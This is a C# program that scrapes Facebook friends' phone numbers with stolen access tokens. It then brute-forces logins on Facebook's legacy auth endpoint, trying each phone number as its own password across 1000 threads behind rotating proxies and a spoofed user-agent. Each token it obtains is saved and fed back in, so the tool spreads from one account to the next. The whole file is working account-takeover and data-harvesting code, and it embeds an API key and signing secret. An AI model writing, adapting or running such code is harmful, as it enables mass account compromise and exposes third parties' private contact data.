using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace GetPhoneFriend
{
    class Program
    {
        private static List<string> listproxy = new List<string>();
        private static List<string> listphone = new List<string>();
        public static string[] proxys;

        static void Main(string[] args)
        {
            Console.Title = "GetPhoneFriend | By : FewHakko";
            List<string> listtoken = new List<string>();
            try
            {
                using (StreamReader streamReader = new StreamReader(new FileStream("gettoken.txt", FileMode.OpenOrCreate, FileAccess.Read), Encoding.UTF8))
                {
                    string text;
                    while ((text = streamReader.ReadLine()) != null)
                    {
                        listtoken.Add(text);
                        using (StreamWriter streamWriter = File.AppendText("token.txt"))
                        {
                            streamWriter.WriteLine(text);
                        }
                    }
                }

                File.Delete("gettoken.txt");

                using (StreamReader streamReader = new StreamReader(new FileStream("proxy.txt", FileMode.OpenOrCreate, FileAccess.Read), Encoding.UTF8))
                {
                    string text;
                    while ((text = streamReader.ReadLine()) != null)
                    {
                        listproxy.Add(text);
                        Console.ForegroundColor = ConsoleColor.Green;
                    }
                    Program.proxys = listproxy.ToArray();
                }

                for (int i = 0; i <= listtoken.Count; i++)
                {
                    getFriend(listtoken[0]);
                    listtoken.RemoveAt(0);
                }

            }
            catch
            {
                using (StreamWriter streamWriter = File.AppendText("gettoken.txt"))
                {
                    streamWriter.WriteLine("");
                }
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("File : gettoken.txt || Token Empty");
                Console.ReadKey();
            }

            Thread[] array = new Thread[1000];
            for (int i = 0; i < 1000; i++)
            {
                Thread t1 = new Thread(new ThreadStart(GetToken));
                t1.Start();
            }

            Thread.Sleep(600000);

            Application.Restart();
            Environment.Exit(0);
        }


        private static void getFriend(string token)
        {
            List<string> list = new List<string>();

            using (WebClient webClient = new WebClient())
            {
                try
                {
                    dynamic val = webClient.DownloadString("https://graph.facebook.com/me/friends?access_token=" + token);
                    webClient.Encoding = Encoding.UTF8;
                    dynamic val2 = JsonConvert.DeserializeObject(val);
                    dynamic val3 = JsonConvert.SerializeObject(val2.data);
                    dynamic val4 = JsonConvert.DeserializeObject(val3);
                    int num = 0;
                    foreach (dynamic item in val4)
                    {
                        num++;
                        string text = item.id;
                        list.Add(text);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[{num}] ID {text}");
                    }
                    getMobilePhone(token, list);
                }
                catch
                {

                }
            }
        }

        private static void getMobilePhone(string token, List<string> idlist)
        {
            using (WebClient webClient = new WebClient())
            {
                for (int i = 0; i <= idlist.Count; i++)
                {
                    string iduser = idlist[0];
                    idlist.RemoveAt(0);

                    string val = webClient.DownloadString("https://graph.facebook.com/" + iduser + "/?fields&access_token=" + token);
                    try
                    {
                        dynamic w = JsonConvert.DeserializeObject(val);
                        string phone = w.mobile_phone;
                        if (phone.Contains("+"))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            if (phone.Length == 12)
                            {
                                string substring = phone.Substring(3);
                                string mobile_phone = "0" + substring;
                                listphone.Add(mobile_phone);
                                Console.WriteLine($"GETNUMBER => {mobile_phone} || ID : {iduser}");

                            }
                            else if (phone.Length == 14)
                            {
                                string substring = phone.Substring(4);
                                string mobile_phone = substring;
                                listphone.Add(mobile_phone);
                                Console.WriteLine($"GETNUMBER => {mobile_phone} || ID : {iduser}");
                            }
                        }
                        else
                        {
                            Console.WriteLine($"GETNUMBER => NOPHONE || ID : {iduser}");
                        }

                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"GETNUMBER => NOPHONE || ID : {iduser}");
                    }
                }
            }
        }

        private static Random rand = new Random();

        private static void GetToken()
        {
            while (true)
            {
                using (MD5 md5Hash = MD5.Create())
                {
                    try
                    {
                        string phonenumber = listphone[0];
                        try
                        {
                            listphone.RemoveAt(0);
                            string source = $"api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={phonenumber}format=JSONmethod=auth.loginpassword={phonenumber}v=1.062f8ce9f74b12f84c123cc23437a4a32";
                            string hash = GetMd5Hash(md5Hash, source);
                            using (WebClient wc = new WebClient())
                            {
                                string address = Program.proxys[Program.rand.Next(0, Program.proxys.Length - 1)];
                                WebProxy proxy = new WebProxy(address);
                                wc.Proxy = proxy;
                                wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36)";
                                string json = wc.DownloadString($"https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={phonenumber}&format=JSON&method=auth.login&password={phonenumber}&v=1.0&sig={hash}");
                                dynamic w = JsonConvert.DeserializeObject(json);
                                try
                                {
                                    if (json.Contains(w.access_token))
                                    {
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine($"SUCCESS | ACC => {phonenumber} | MESSAGE => {w.access_token}");

                                        using (StreamWriter streamWriter = File.AppendText("gettoken.txt"))
                                        {
                                            streamWriter.WriteLine(w.access_token);
                                        }
                                    }
                                }
                                catch
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"FAIL | ACC => {phonenumber} | MESSAGE => {w.error_msg}");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            listphone.Add(phonenumber);
                            //Console.WriteLine(ex.Message);
                        }
                    }
                    catch
                    {

                    }
                }
            }
        }

        static string GetMd5Hash(MD5 md5Hash, string input)
        {
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            StringBuilder sBuilder = new StringBuilder();

            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }

            return sBuilder.ToString();
        }
    }
}
